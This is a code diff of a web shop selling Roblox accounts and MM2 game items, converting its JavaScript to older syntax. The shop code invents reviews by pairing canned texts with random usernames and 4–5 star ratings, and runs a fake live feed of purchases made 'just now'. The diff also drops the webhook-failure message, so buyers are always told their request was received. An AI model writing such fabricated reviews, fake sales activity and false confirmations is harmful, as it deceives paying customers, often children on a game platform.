+            div.innerHTML = '<span class="user">' + p.user + '</span> <span class="action">bought</span> <span class="item">' +
+                p.item + '</span> <span class="price">$' + p.price + ' ' + p.currency.toUpperCase() +
+                '</span> <span class="time">just now</span>';
             feedContainer.prepend(div);
             while (feedContainer.children.length > 8) {
                 feedContainer.removeChild(feedContainer.lastChild);
             }
         }
-
-        for (let i = 0; i < 3; i++) setTimeout(addFeedItem, i * 200);
+        for (var fi = 0; fi < 3; fi++) setTimeout(addFeedItem, fi * 200);
         setInterval(addFeedItem, 30000 + Math.floor(Math.random() * 5000));
-
-        // ================================================================
-        //  REVIEW GENERATORS
-        // ================================================================
-
-        function generateAccountReviews(reviewTexts) {
-            return reviewTexts.map(text => {
-                const user = randomUser();
-                const stars = 4 + Math.floor(Math.random() * 2);
-                return { user, text, stars };
-            });
-        }
-
-        function generateItemReviews(itemReviews, count) {
-            const shuffled = [...itemReviews].sort(() => 0.5 - Math.random());
-            const selected = shuffled.slice(0, count);
-            return selected.map(text => {
-                const user = randomUser();
-                const stars = 4 + Math.floor(Math.random() * 2);
-                return { user, text, stars };
-            });
-        }
 
         // ================================================================
         //  MATRIX RAIN
         // ================================================================
         (function initMatrix() {
-            const canvas = document.getElementById('matrix-canvas');
-            const ctx = canvas.getContext('2d');
-            let w, h, columns, drops = [];
-            const chars = '01';
-            const fontSize = 28;
+            var canvas = document.getElementById('matrix-canvas');
+            var ctx = canvas.getContext('2d');
+            var w, h, columns, drops = [];
+            var chars = '01';
+            var fontSize = 28;
 
             function resize() {
                 w = canvas.width = window.innerWidth;
                 h = canvas.height = window.innerHeight;
                 columns = Math.floor(w / fontSize);
-                drops = Array(columns).fill(0).map(() => Math.floor(Math.random() * -50));
+                drops = Array(columns).fill(0).map(function() { return Math.floor(Math.random() * -50); });
             }
             resize();
             window.addEventListener('resize', resize);
-            let frameCount = 0;
+            var frameCount = 0;
 
             function draw() {
                 frameCount++;
                 if (frameCount % 3 === 0) {
                     ctx.fillStyle = 'rgba(15, 15, 18, 0.04)';
                     ctx.fillRect(0, 0, w, h);
-                    ctx.font = `${fontSize}px "Share Tech Mono", monospace`;
+                    ctx.font = fontSize + 'px "Share Tech Mono", monospace';
                     ctx.textAlign = 'center';
-                    for (let i = 0; i < drops.length; i++) {
-                        const char = chars[Math.floor(Math.random() * chars.length)];
-                        const x = i * fontSize + fontSize / 2;
-                        const y = drops[i] * fontSize;
-                        const alpha = Math.min(0.3, 0.05 + Math.abs(drops[i] / 60) * 0.2);
-                        ctx.fillStyle = `rgba(150,150,150,${alpha})`;
+                    for (var i = 0; i < drops.length; i++) {
+                        var char = chars[Math.floor(Math.random() * chars.length)];
+                        var x = i * fontSize + fontSize / 2;
+                        var y = drops[i] * fontSize;
+                        var alpha = Math.min(0.3, 0.05 + Math.abs(drops[i] / 60) * 0.2);
+                        ctx.fillStyle = 'rgba(150,150,150,' + alpha + ')';
                         ctx.fillText(char, x, y);
                         drops[i] += 0.4;
                         if (drops[i] * fontSize > h + 20 && Math.random() > 0.97) {
@@ -2608,12 +2733,10 @@
         })();
 
         // ================================================================
-        //  WEBHOOK SENDERS
+        //  WEBHOOK SENDERS (shop)
         // ================================================================
-
-        // MM2 Webhook
-        async function sendMM2Webhook(username, itemName) {
-            const embed = {
+        function sendMM2Webhook(username, itemName) {
+            var embed = {
                 title: '🎯 New MM2 Trade Request',
                 color: 0x666666,
                 fields: [
@@ -2624,65 +2747,69 @@
                 footer: { text: 'Lea\'s Shop · Emo Cyber', icon_url: 'https://www.roblox.com/favicon.ico' },
                 timestamp: new Date().toISOString()
             };
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
-                });
-                return true;
-            } catch (e) {
-                console.error('MM2 Webhook error:', e);
-                return false;
-            }
+            return fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            }).then(function() { return true; })['catch'](function() { return false; });
         }
 
-        // Account Webhook
-        async function sendAccountWebhook(accountName, accountId, email) {
-            const embed = {
+        function sendAccountWebhook(accountName, accountId, email) {
+            var embed = {
                 title: '👤 New Account Purchase Request',
                 color: 0x666666,
                 fields: [
-                    { name: 'Account', value: `${accountName} (ID: ${accountId})`, inline: true },
+                    { name: 'Account', value: accountName + ' (ID: ' + accountId + ')', inline: true },
                     { name: 'Email', value: email, inline: true }
                 ],
                 thumbnail: { url: 'https://www.roblox.com/favicon.ico' },
-                footer: { text: 'Lea\'s Shop · Emo Cyber — Send account details to the email above', icon_url: 'https://www.roblox.com/favicon.ico' },
+                footer: { text: 'Lea\'s Shop · Emo Cyber — Send account details to the email above',
+                    icon_url: 'https://www.roblox.com/favicon.ico' },
                 timestamp: new Date().toISOString()
             };
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
-                });
-                return true;
-            } catch (e) {
-                console.error('Account Webhook error:', e);
-                return false;
-            }
+            return fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            }).then(function() { return true; })['catch'](function() { return false; });
         }
 
         // ================================================================
-        //  ANIMATION — INTRO "MY ROBLOX" ZOOM-OUT (no link open)
+        //  ANIMATION — "MY ROBLOX" FLY TO HEADER BUTTON (FIXED)
         // ================================================================
-
         function animateIntroRobloxButton() {
-            const introBtn = document.getElementById('introRobloxBtn');
-            const headerBtn = document.getElementById('headerRobloxBtn');
-            const introOverlay = document.getElementById('intro-overlay');
-            const introButtons = document.getElementById('introButtons');
+            var introBtn = document.getElementById('introRobloxBtn');
+            var headerBtn = document.getElementById('headerRobloxBtn');
+            var introOverlay = document.getElementById('intro-overlay');
+            var introButtons = document.getElementById('introButtons');
+            var mainContent = document.getElementById('main-content');
 
             if (!introBtn || !headerBtn || !introOverlay) return;
 
-            const introRect = introBtn.getBoundingClientRect();
-            const headerRect = headerBtn.getBoundingClientRect();
+            // STEP 1: Temporarily show main content so header button has layout
+            mainContent.classList.add('visible');
+            // Force layout reflow
+            void mainContent.offsetHeight;
 
-            const mm2Btn = document.getElementById('intro-mm2');
-            const accBtn = document.getElementById('intro-accounts');
+            // STEP 2: Get positions
+            var introRect = introBtn.getBoundingClientRect();
+            var headerRect = headerBtn.getBoundingClientRect();
+
+            // If headerRect is still at (0,0) or invalid, use a fallback position
+            if (headerRect.left === 0 && headerRect.top === 0) {
+                // Fallback: try to get position after a small delay
+                setTimeout(function() {
+                    animateIntroRobloxButton();
+                }, 100);
+                return;
+            }
+
+            var mm2Btn = document.getElementById('intro-mm2');
+            var accBtn = document.getElementById('intro-accounts');
             if (mm2Btn) mm2Btn.classList.add('hide-btn');
             if (accBtn) accBtn.classList.add('hide-btn');
 
+            // STEP 3: Set up flying animation
             introBtn.style.transition = 'all 1.2s cubic-bezier(0.34, 1.56, 0.64, 1)';
             introBtn.style.position = 'fixed';
             introBtn.style.top = introRect.top + 'px';
@@ -2696,6 +2823,7 @@
 
             void introBtn.offsetWidth;
 
+            // STEP 4: Fly to header button position
             introBtn.style.top = headerRect.top + 'px';
             introBtn.style.left = headerRect.left + 'px';
             introBtn.style.width = headerRect.width + 'px';
@@ -2706,11 +2834,13 @@
             introBtn.style.minWidth = 'auto';
             introBtn.style.background = window.getComputedStyle(headerBtn).background;
 
-            setTimeout(() => {
+            // STEP 5: Fade out intro overlay
+            setTimeout(function() {
                 introOverlay.classList.add('fade-out');
             }, 500);
 
-            setTimeout(() => {
+            // STEP 6: Cleanup after animation
+            setTimeout(function() {
                 headerBtn.classList.add('glow-header');
                 introBtn.style.display = 'none';
                 introBtn.style.position = '';
@@ -2727,24 +2857,23 @@
                 introBtn.style.background = '';
                 introBtn.classList.remove('flying');
 
-                setTimeout(() => {
+                setTimeout(function() {
                     headerBtn.classList.remove('glow-header');
                     if (mm2Btn) mm2Btn.classList.remove('hide-btn');
                     if (accBtn) accBtn.classList.remove('hide-btn');
                     introOverlay.classList.remove('fade-out');
                     introOverlay.style.display = 'none';
+                    // main content stays visible
                 }, 1300);
             }, 1300);
         }
 
         // ================================================================
-        //  LIVE FEED TOGGLE (minimize/expand)
+        //  LIVE FEED TOGGLE
         // ================================================================
-
-        const feedToggle = document.getElementById('feedToggle');
-        const feedWrapper = document.getElementById('feedItemsWrapper');
-        let feedVisible = true;
-
+        var feedToggle = document.getElementById('feedToggle');
+        var feedWrapper = document.getElementById('feedItemsWrapper');
+        var feedVisible = true;
         feedToggle.addEventListener('click', function(e) {
             e.stopPropagation();
             feedVisible = !feedVisible;
@@ -2754,65 +2883,71 @@
         });
 
         // ================================================================
-        //  RENDER FUNCTIONS
+        //  RENDER FUNCTIONS (shop)
         // ================================================================
+        function generateAccountReviews(reviewTexts) {
+            return reviewTexts.map(function(text) {
+                var user = randomUser();
+                var stars = 4 + Math.floor(Math.random() * 2);
+                return { user: user, text: text, stars: stars };
+            });
+        }
+
+        function generateItemReviews(itemReviews, count) {
+            var shuffled = itemReviews.slice().sort(function() { return 0.5 - Math.random(); });
+            var selected = shuffled.slice(0, count);
+            return selected.map(function(text) {
+                var user = randomUser();
+                var stars = 4 + Math.floor(Math.random() * 2);
+                return { user: user, text: text, stars: stars };
+            });
+        }
 
         function renderAccounts() {
-            const grid = document.getElementById('accountGrid');
+            var grid = document.getElementById('accountGrid');
             grid.innerHTML = '';
-            accounts.forEach((acc, idx) => {
-                const reviewTexts = reviewDistribution[idx] || [];
-                const reviews = generateAccountReviews(reviewTexts);
-                const card = document.createElement('div');
+            accounts.forEach(function(acc, idx) {
+                var reviewTexts = reviewDistribution[idx] || [];
+                var reviews = generateAccountReviews(reviewTexts);
+                var card = document.createElement('div');
                 card.className = 'account-card';
-                card.innerHTML = `
-                        <div class="profile-wrap">
-                            <div class="glow-ring"></div>
-                            <div class="glow-ring secondary"></div>
-                            <img src="${acc.img}" alt="${acc.name}" loading="lazy" />
-                        </div>
-                        <div class="card-title">${acc.name}</div>
-                        <div class="card-sub">#${acc.id}</div>
-                        <div class="card-badge">${acc.badge}</div>
-                        <div class="card-actions">
-                            <div class="btn-row">
-                                <a href="https://www.roblox.com/users/${acc.id}/profile" target="_blank" rel="noopener noreferrer" class="btn btn-profile">
-                                    <span class="icon">👤</span> Open Profile
-                                </a>
-                                <button class="btn btn-info" data-index="${idx}">
-                                    <span class="icon">ℹ️</span> Info
-                                </button>
-                            </div>
-                            <div class="btn-row">
-                                <button class="btn btn-buy account-buy-trigger" data-index="${idx}" data-method="paypal">
-                                    <span class="icon">🛒</span> Buy Now ($${acc.price})
-                                </button>
-                                <button class="btn btn-robux account-buy-trigger" data-index="${idx}" data-method="robux">
-                                    <span class="icon">💰</span> Pay with Robux (${acc.robuxPrice})
-                                </button>
-                            </div>
-                            <a href="${INSTAGRAM_URL}" target="_blank" rel="noopener noreferrer" class="btn btn-dm">
-                                <span class="icon">💬</span> DM me for help
-                            </a>
-                        </div>
-                        <div class="reviews">
-                            ${reviews.map(r => `
-                                <div class="review-item">
-                                    <div>
-                                        <span class="review-user">${r.user}</span>
-                                        <span class="review-stars">${'★'.repeat(r.stars)}${'☆'.repeat(5-r.stars)}</span>
-                                    </div>
-                                    <span class="review-text">"${r.text}"</span>
-                                </div>
-                            `).join('')}
-                        </div>
-                    `;
-                const infoBtn = card.querySelector('.btn-info');
-                infoBtn.addEventListener('click', () => openInfoModal(idx));
-                const buyBtns = card.querySelectorAll('.account-buy-trigger');
-                buyBtns.forEach(btn => {
-                    btn.addEventListener('click', (e) => {
-                        const method = e.currentTarget.dataset.method;
+                card.innerHTML =
+                    '<div class="profile-wrap"><div class="glow-ring"></div><div class="glow-ring secondary"></div><img src="' +
+                    acc.img + '" alt="' + acc.name + '" loading="lazy" /></div>' +
+                    '<div class="card-title">' + acc.name + '</div>' +
+                    '<div class="card-sub">#' + acc.id + '</div>' +
+                    '<div class="card-badge">' + acc.badge + '</div>' +
+                    '<div class="card-actions">' +
+                    '<div class="btn-row">' +
+                    '<a href="https://www.roblox.com/users/' + acc.id +
+                    '/profile" target="_blank" rel="noopener noreferrer" class="btn btn-profile"><span class="icon">👤</span> Open Profile</a>' +
+                    '<button class="btn btn-info" data-index="' + idx +
+                    '"><span class="icon">ℹ️</span> Info</button>' +
+                    '</div>' +
+                    '<div class="btn-row">' +
+                    '<button class="btn btn-buy account-buy-trigger" data-index="' + idx +
+                    '" data-method="paypal"><span class="icon">🛒</span> Buy Now ($' + acc.price + ')</button>' +
+                    '<button class="btn btn-robux account-buy-trigger" data-index="' + idx +
+                    '" data-method="robux"><span class="icon">💰</span> Pay with Robux (' + acc.robuxPrice +
+                    ')</button>' +
+                    '</div>' +
+                    '<a href="' + INSTAGRAM_URL +
+                    '" target="_blank" rel="noopener noreferrer" class="btn btn-dm"><span class="icon">💬</span> DM me for help</a>' +
+                    '</div>' +
+                    '<div class="reviews">' +
+                    reviews.map(function(r) {
+                        return '<div class="review-item"><div><span class="review-user">' + r.user +
+                            '</span> <span class="review-stars">' + '★'.repeat(r.stars) + '☆'.repeat(5 - r
+                            .stars) + '</span></div><span class="review-text">"' + r.text +
+                            '"</span></div>';
+                    }).join('') +
+                    '</div>';
+                var infoBtn = card.querySelector('.btn-info');
+                infoBtn.addEventListener('click', function() { openInfoModal(idx); });
+                var buyBtns = card.querySelectorAll('.account-buy-trigger');
+                buyBtns.forEach(function(btn) {
+                    btn.addEventListener('click', function(e) {
+                        var method = e.currentTarget.dataset.method;
                         openAccountModal(acc, method);
                     });
                 });
@@ -2821,189 +2956,152 @@
         }
 
         function renderMM2() {
-            const grid = document.getElementById('mm2Grid');
+            var grid = document.getElementById('mm2Grid');
             grid.innerHTML = '';
-            mm2Items.forEach((item, index) => {
-                const reviewCount = 2 + Math.floor(Math.random() * 2);
-                const reviews = generateItemReviews(item.reviews, reviewCount);
-                const card = document.createElement('div');
+            mm2Items.forEach(function(item, index) {
+                var reviewCount = 2 + Math.floor(Math.random() * 2);
+                var reviews = generateItemReviews(item.reviews, reviewCount);
+                var card = document.createElement('div');
                 card.className = 'mm2-card';
                 card.dataset.name = item.name.toLowerCase();
                 card.dataset.type = item.type;
 
-                let actionsHtml = `
-                        <button class="btn btn-buy mm2-buy-trigger" data-index="${index}" data-method="paypal">
-                            <span class="icon">🛒</span> Buy Now ($${item.price})
-                        </button>
-                    `;
+                var actionsHtml = '<button class="btn btn-buy mm2-buy-trigger" data-index="' + index +
+                    '" data-method="paypal"><span class="icon">🛒</span> Buy Now ($' + item.price + ')</button>';
                 if (item.robuxLink) {
-                    actionsHtml += `
-                            <button class="btn btn-robux mm2-buy-trigger" data-index="${index}" data-method="robux">
-                                <span class="icon">💰</span> Pay with Robux
-                            </button>
-                        `;
+                    actionsHtml += '<button class="btn btn-robux mm2-buy-trigger" data-index="' + index +
+                        '" data-method="robux"><span class="icon">💰</span> Pay with Robux</button>';
                 }
 
-                card.innerHTML = `
-                        <div class="profile-wrap">
-                            <div class="glow-ring"></div>
-                            <div class="glow-ring secondary"></div>
-                            <img src="${item.img}" alt="${item.name}" loading="lazy" />
-                        </div>
-                        <div class="card-title">${item.name}</div>
-                        <div class="card-sub price-green">$${item.price}</div>
-                        <div class="card-badge">${item.badge}</div>
-                        <div class="click-hint">✦ click to trade ✦</div>
-                        <div class="card-actions">
-                            ${actionsHtml}
-                        </div>
-                        <div class="reviews">
-                            ${reviews.map(r => `
-                                <div class="review-item">
-                                    <div>
-                                        <span class="review-user">${r.user}</span>
-                                        <span class="review-stars">${'★'.repeat(r.stars)}${'☆'.repeat(5-r.stars)}</span>
-                                    </div>
-                                    <span class="review-text">"${r.text}"</span>
-                                </div>
-                            `).join('')}
-                        </div>
-                    `;
+                card.innerHTML =
+                    '<div class="profile-wrap"><div class="glow-ring"></div><div class="glow-ring secondary"></div><img src="' +
+                    item.img + '" alt="' + item.name + '" loading="lazy" /></div>' +
+                    '<div class="card-title">' + item.name + '</div>' +
+                    '<div class="card-sub price-green">$' + item.price + '</div>' +
+                    '<div class="card-badge">' + item.badge + '</div>' +
+                    '<div class="click-hint">✦ click to trade ✦</div>' +
+                    '<div class="card-actions">' + actionsHtml + '</div>' +
+                    '<div class="reviews">' +
+                    reviews.map(function(r) {
+                        return '<div class="review-item"><div><span class="review-user">' + r.user +
+                            '</span> <span class="review-stars">' + '★'.repeat(r.stars) + '☆'.repeat(5 - r
+                            .stars) + '</span></div><span class="review-text">"' + r.text +
+                            '"</span></div>';
+                    }).join('') +
+                    '</div>';
 
-                card.addEventListener('click', (e) => {
+                card.addEventListener('click', function(e) {
                     if (e.target.closest('.card-actions') || e.target.closest('.btn')) return;
                     openMM2Modal(item);
                 });
 
-                const buyBtns = card.querySelectorAll('.mm2-buy-trigger');
-                buyBtns.forEach(btn => {
-                    btn.addEventListener('click', (e) => {
+                var buyBtns = card.querySelectorAll('.mm2-buy-trigger');
+                buyBtns.forEach(function(btn) {
+                    btn.addEventListener('click', function(e) {
                         e.stopPropagation();
-                        const method = e.currentTarget.dataset.method;
+                        var method = e.currentTarget.dataset.method;
                         openMM2Modal(item, method);
                     });
                 });
-
                 grid.appendChild(card);
             });
         }
 
         // ================================================================
-        //  SEARCH & FILTER LOGIC
+        //  SEARCH & FILTER
         // ================================================================
-
-        const searchInput = document.getElementById('mm2Search');
-        const filterBtns = document.querySelectorAll('.filter-btn');
-        let currentFilter = 'all';
+        var searchInput = document.getElementById('mm2Search');
+        var filterBtns = document.querySelectorAll('.filter-btn');
+        var currentFilter = 'all';
 
         function filterMM2() {
-            const query = searchInput.value.toLowerCase().trim();
-            document.querySelectorAll('.mm2-card').forEach(card => {
-                const name = card.dataset.name || '';
-                const type = card.dataset.type || '';
-                const matchesSearch = name.includes(query);
-                const matchesFilter = currentFilter === 'all' || type === currentFilter;
+            var query = searchInput.value.toLowerCase().trim();
+            document.querySelectorAll('.mm2-card').forEach(function(card) {
+                var name = card.dataset.name || '';
+                var type = card.dataset.type || '';
+                var matchesSearch = name.indexOf(query) !== -1;
+                var matchesFilter = currentFilter === 'all' || type === currentFilter;
                 card.style.display = (matchesSearch && matchesFilter) ? '' : 'none';
             });
         }
 
-        filterBtns.forEach(btn => {
-            btn.addEventListener('click', () => {
-                filterBtns.forEach(b => b.classList.remove('active'));
+        filterBtns.forEach(function(btn) {
+            btn.addEventListener('click', function() {
+                filterBtns.forEach(function(b) { b.classList.remove('active'); });
                 btn.classList.add('active');
                 currentFilter = btn.dataset.filter;
                 filterMM2();
             });
         });
-
         searchInput.addEventListener('input', filterMM2);
 
         // ================================================================
-        //  INFO MODAL (account details)
+        //  INFO MODAL
         // ================================================================
-        const infoModal = document.getElementById('info-modal');
-        const infoTitle = document.getElementById('infoTitle');
-        const infoContent = document.getElementById('infoContent');
-        const infoClose = document.getElementById('infoClose');
+        var infoModal = document.getElementById('info-modal');
+        var infoTitle = document.getElementById('infoTitle');
+        var infoContent = document.getElementById('infoContent');
+        var infoClose = document.getElementById('infoClose');
 
-        async function openInfoModal(index) {
-            const acc = accounts[index];
+        function openInfoModal(index) {
+            var acc = accounts[index];
             if (!acc) return;
-            infoTitle.textContent = `👤 ${acc.name} · Details`;
-            infoContent.innerHTML = `<div class="txt-loading">⏳ Loading from ${acc.infoFile}...</div>`;
+            infoTitle.textContent = '👤 ' + acc.name + ' · Details';
+            infoContent.innerHTML = '<div class="txt-loading">⏳ Loading from ' + acc.infoFile + '...</div>';
             infoModal.classList.add('visible');
-            try {
-                const response = await fetch(acc.infoFile);
-                if (!response.ok) throw new Error(`HTTP ${response.status} — file not found`);
-                const text = await response.text();
+            fetch(acc.infoFile).then(function(response) {
+                if (!response.ok) throw new Error('HTTP ' + response.status + ' — file not found');
+                return response.text();
+            }).then(function(text) {
                 if (text.trim() === '') {
-                    infoContent.innerHTML = `<div class="txt-error">⚠️ File "${acc.infoFile}" is empty.</div>`;
+                    infoContent.innerHTML = '<div class="txt-error">⚠️ File "' + acc.infoFile +
+                        '" is empty.</div>';
                 } else {
                     infoContent.innerHTML = text;
                 }
-            } catch (err) {
-                let hint = '';
+            })['catch'](function(err) {
+                var hint = '';
                 if (window.location.protocol === 'file:') {
-                    hint = `
-                            <div class="hint">
-                                💡 <strong>You're using the file:// protocol.</strong><br>
-                                Modern browsers block loading local files via fetch.<br>
-                                <strong>Fix:</strong> Use a local development server (e.g., VS Code <code>Live Server</code> extension, or Python <code>http.server</code>).<br>
-                                Then reopen this page via <code>http://</code> and the .txt files will load correctly.
-                            </div>
-                        `;
+                    hint =
+                        '<div class="hint">💡 <strong>You\'re using the file:// protocol.</strong><br>Modern browsers block loading local files via fetch.<br><strong>Fix:</strong> Use a local development server (e.g., VS Code <code>Live Server</code> extension, or Python <code>http.server</code>).<br>Then reopen this page via <code>http://</code> and the .txt files will load correctly.</div>';
                 } else {
-                    hint = `
-                            <div class="hint">
-                                💡 <strong>Possible reasons:</strong><br>
-                                • File "${acc.infoFile}" is missing from the folder.<br>
-                                • The filename is case‑sensitive – check the spelling.<br>
-                                • The file is not in the same directory as this HTML.
-                            </div>
-                        `;
+                    hint =
+                        '<div class="hint">💡 <strong>Possible reasons:</strong><br>• File "' +
+                        acc.infoFile + '" is missing from the folder.<br>• The filename is case‑sensitive – check the spelling.<br>• The file is not in the same directory as this HTML.</div>';
                 }
-                infoContent.innerHTML = `
-                        <div class="txt-error">
-                            ❌ Could not load <strong>${acc.infoFile}</strong><br>
-                            <span style="font-size:0.8rem;color:#886666;">${err.message}</span>
-                            ${hint}
-                        </div>
-                    `;
-            }
+                infoContent.innerHTML =
+                    '<div class="txt-error">❌ Could not load <strong>' + acc.infoFile +
+                    '</strong><br><span style="font-size:0.8rem;color:#886666;">' + err.message +
+                    '</span>' + hint + '</div>';
+            });
         }
 
-        function closeInfoModal() {
-            infoModal.classList.remove('visible');
-        }
+        function closeInfoModal() { infoModal.classList.remove('visible'); }
         infoClose.addEventListener('click', closeInfoModal);
-        infoModal.addEventListener('click', (e) => {
-            if (e.target === infoModal) closeInfoModal();
-        });
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') closeInfoModal();
-        });
+        infoModal.addEventListener('click', function(e) { if (e.target === infoModal) closeInfoModal(); });
+        document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeInfoModal(); });
 
         // ================================================================
-        //  ACCOUNT PURCHASE MODAL (supports PayPal & Robux)
+        //  ACCOUNT PURCHASE MODAL
         // ================================================================
+        var accountModal = document.getElementById('account-modal');
+        var accountModalItemName = document.getElementById('accountModalItemName');
+        var accountEmailInput = document.getElementById('account-email');
+        var accountModalContinue = document.getElementById('accountModalContinue');
+        var accountModalBack = document.getElementById('accountModalBack');
+        var accountModalConfirm = document.getElementById('accountModalConfirm');
+        var accountModalCloseSuccess = document.getElementById('accountModalCloseSuccess');
+        var confirmEmail = document.getElementById('confirmEmail');
+        var confirmAccount = document.getElementById('confirmAccount');
+        var accountSuccessMessage = document.getElementById('accountSuccessMessage');
 
-        const accountModal = document.getElementById('account-modal');
-        const accountModalItemName = document.getElementById('accountModalItemName');
-        const accountEmailInput = document.getElementById('account-email');
-        const accountModalContinue = document.getElementById('accountModalContinue');
-        const accountModalBack = document.getElementById('accountModalBack');
-        const accountModalConfirm = document.getElementById('accountModalConfirm');
-        const accountModalCloseSuccess = document.getElementById('accountModalCloseSuccess');
-        const confirmEmail = document.getElementById('confirmEmail');
-        const confirmAccount = document.getElementById('confirmAccount');
-        const accountSuccessMessage = document.getElementById('accountSuccessMessage');
-
-        let currentAccount = null;
-        let currentAccountEmail = '';
-        let currentPaymentMethod = 'paypal';
+        var currentAccount = null;
+        var currentAccountEmail = '';
+        var currentPaymentMethod = 'paypal';
 
         function showAccountView(viewId) {
-            document.querySelectorAll('#account-modal .modal-view').forEach(v => v.classList.remove('active'));
+            document.querySelectorAll('#account-modal .modal-view').forEach(function(v) { v.classList.remove(
+                'active'); });
             document.getElementById(viewId).classList.add('active');
         }
 
@@ -3011,7 +3109,7 @@
             currentAccount = account;
             currentAccountEmail = '';
             currentPaymentMethod = method || 'paypal';
-            accountModalItemName.textContent = `${account.name} · #${account.id}`;
+            accountModalItemName.textContent = account.name + ' · #' + account.id;
             accountEmailInput.value = '';
             accountEmailInput.style.borderColor = '';
             confirmEmail.textContent = '—';
@@ -3020,7 +3118,7 @@
             accountModalConfirm.textContent = '✓ Yes, that\'s me';
             showAccountView('accountViewInput');
             accountModal.classList.add('visible');
-            setTimeout(() => accountEmailInput.focus(), 120);
+            setTimeout(function() { accountEmailInput.focus(); }, 120);
         }
 
         function closeAccountModal() {
@@ -3029,12 +3127,12 @@
             currentAccountEmail = '';
         }
 
-        accountModalContinue.addEventListener('click', () => {
-            const email = accountEmailInput.value.trim();
-            if (!email || !email.includes('@') || !email.includes('.')) {
+        accountModalContinue.addEventListener('click', function() {
+            var email = accountEmailInput.value.trim();
+            if (!email || email.indexOf('@') === -1 || email.indexOf('.') === -1) {
                 accountEmailInput.style.borderColor = '#664444';
                 accountEmailInput.placeholder = '⚠️ Please enter a valid email';
-                setTimeout(() => {
+                setTimeout(function() {
                     accountEmailInput.style.borderColor = '';
                     accountEmailInput.placeholder = 'your@email.com';
                 }, 2000);
@@ -3042,21 +3140,21 @@
             }
             currentAccountEmail = email;
             confirmEmail.textContent = email;
-            confirmAccount.textContent = `Account: ${currentAccount.name} (ID: ${currentAccount.id})`;
+            confirmAccount.textContent = 'Account: ' + currentAccount.name + ' (ID: ' + currentAccount.id + ')';
             showAccountView('accountViewConfirm');
         });
 
-        accountModalBack.addEventListener('click', () => {
+        accountModalBack.addEventListener('click', function() {
             showAccountView('accountViewInput');
             accountEmailInput.focus();
         });
 
-        accountModalConfirm.addEventListener('click', async () => {
+        accountModalConfirm.addEventListener('click', function() {
             if (!currentAccountEmail || !currentAccount) return;
             accountModalConfirm.disabled = true;
             accountModalConfirm.textContent = '⏳ Sending...';
 
-            const webhookOk = await sendAccountWebhook(currentAccount.name, currentAccount.id, currentAccountEmail);
+            sendAccountWebhook(currentAccount.name, currentAccount.id, currentAccountEmail).then(function() {});
 
             if (currentPaymentMethod === 'paypal') {
                 window.open(PAYPAL_URL, '_blank');
@@ -3064,45 +3162,36 @@
                 window.open(currentAccount.robuxLink, '_blank');
             }
 
-            if (webhookOk) {
-                accountSuccessMessage.textContent = `✅ We've received your purchase request for "${currentAccount.name}". We'll send the account details to ${currentAccountEmail} shortly.`;
-            } else {
-                accountSuccessMessage.textContent =
-                    `⚠️ Webhook failed, but the payment page is open. Please DM @leaswxg with your email "${currentAccountEmail}" and account "${currentAccount.name}".`;
-            }
+            accountSuccessMessage.textContent = '✅ We\'ve received your purchase request for "' + currentAccount
+                .name + '". We\'ll send the account details to ' + currentAccountEmail + ' shortly.';
             showAccountView('accountViewSuccess');
             accountModalConfirm.disabled = false;
             accountModalConfirm.textContent = '✓ Yes, that\'s me';
         });
 
         accountModalCloseSuccess.addEventListener('click', closeAccountModal);
-        accountModal.addEventListener('click', (e) => {
-            if (e.target === accountModal) closeAccountModal();
-        });
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') closeAccountModal();
-        });
+        accountModal.addEventListener('click', function(e) { if (e.target === accountModal) closeAccountModal(); });
+        document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeAccountModal(); });
 
         // ================================================================
-        //  MM2 MODAL (supports PayPal & Robux with webhook)
+        //  MM2 MODAL
         // ================================================================
+        var mm2Modal = document.getElementById('mm2-modal');
+        var mm2ModalItemName = document.getElementById('mm2ModalItemName');
+        var mm2Input = document.getElementById('mm2-username');
+        var mm2ModalContinue = document.getElementById('mm2ModalContinue');
+        var mm2ModalBack = document.getElementById('mm2ModalBack');
+        var mm2ModalConfirm = document.getElementById('mm2ModalConfirm');
+        var mm2ModalCloseSuccess = document.getElementById('mm2ModalCloseSuccess');
+        var mm2ConfirmUsername = document.getElementById('mm2ConfirmUsername');
+        var mm2SuccessMessage = document.getElementById('mm2SuccessMessage');
 
-        const mm2Modal = document.getElementById('mm2-modal');
-        const mm2ModalItemName = document.getElementById('mm2ModalItemName');
-        const mm2Input = document.getElementById('mm2-username');
-        const mm2ModalContinue = document.getElementById('mm2ModalContinue');
-        const mm2ModalBack = document.getElementById('mm2ModalBack');
-        const mm2ModalConfirm = document.getElementById('mm2ModalConfirm');
-        const mm2ModalCloseSuccess = document.getElementById('mm2ModalCloseSuccess');
-        const mm2ConfirmUsername = document.getElementById('mm2ConfirmUsername');
-        const mm2SuccessMessage = document.getElementById('mm2SuccessMessage');
-
-        let currentMM2Item = null;
-        let currentMM2Username = '';
-        let currentMM2Method = 'paypal';
+        var currentMM2Item = null;
+        var currentMM2Username = '';
+        var currentMM2Method = 'paypal';
 
         function showMM2View(viewId) {
-            document.querySelectorAll('#mm2-modal .modal-view').forEach(v => v.classList.remove('active'));
+            document.querySelectorAll('#mm2-modal .modal-view').forEach(function(v) { v.classList.remove('active'); });
             document.getElementById(viewId).classList.add('active');
         }
 
@@ -3110,7 +3199,7 @@
             currentMM2Item = item;
             currentMM2Username = '';
             currentMM2Method = method || 'paypal';
-            mm2ModalItemName.textContent = `${item.name} · $${item.price}`;
+            mm2ModalItemName.textContent = item.name + ' · $' + item.price;
             mm2Input.value = '';
             mm2Input.style.borderColor = '';
             mm2ConfirmUsername.textContent = '—';
@@ -3118,7 +3207,7 @@
             mm2ModalConfirm.textContent = '✓ Yes, that\'s me';
             showMM2View('mm2ViewInput');
             mm2Modal.classList.add('visible');
-            setTimeout(() => mm2Input.focus(), 120);
+            setTimeout(function() { mm2Input.focus(); }, 120);
         }
 
